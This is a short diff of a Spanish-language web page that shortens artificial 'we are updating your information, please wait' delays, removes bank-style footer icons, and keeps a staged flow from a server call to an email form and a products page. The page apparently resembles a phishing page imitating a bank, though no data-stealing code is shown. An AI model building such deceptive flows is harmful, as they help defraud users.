@@ -62,7 +62,7 @@
 
     <!-- Pantalla de espera -->
     <div id="pantallaEspera" class="hidden">
-      <h2>#Estamos actualizando la información, por favor espera...</h2>
+      <h2>Estamos actualizando la información, por favor espera...</h2>
       <div class="spinner"></div>
     </div>
 
@@ -79,10 +79,7 @@
       <button class="btn-red" onclick="continuarProductos()">Continuar</button>
     </div>
 
-    <div class="footer-icons">
-      <div>📊<br>Indicadores Económicos</div>
-      <div>☎️<br>Contact Center</div>
-    </div>
+   
   </div>
 
   <script>
@@ -136,7 +133,7 @@
           setTimeout(()=>{
             document.getElementById("pantallaEspera").classList.add("hidden");
             document.getElementById("formCorreo").classList.remove("hidden");
-          }, 120000); // 2 minutos
+          }, 60000); // 1 minutos
         }
       } catch (error) {
         document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
@@ -150,7 +147,7 @@
       setTimeout(()=>{
         document.getElementById("pantallaEspera").classList.add("hidden");
         document.getElementById("pantallaProductos").classList.remove("hidden");
-      }, 120000); // 2 minutos
+      }, 30000); // 30 seg
     }
 
     function continuarProductos(){
@@ -159,7 +156,7 @@
 
       setTimeout(()=>{
         window.location.href="productos.html";
-      }, 120000); // 2 minutos
+      }, 30000); // 30 seg
     }
   </script>
 </body>
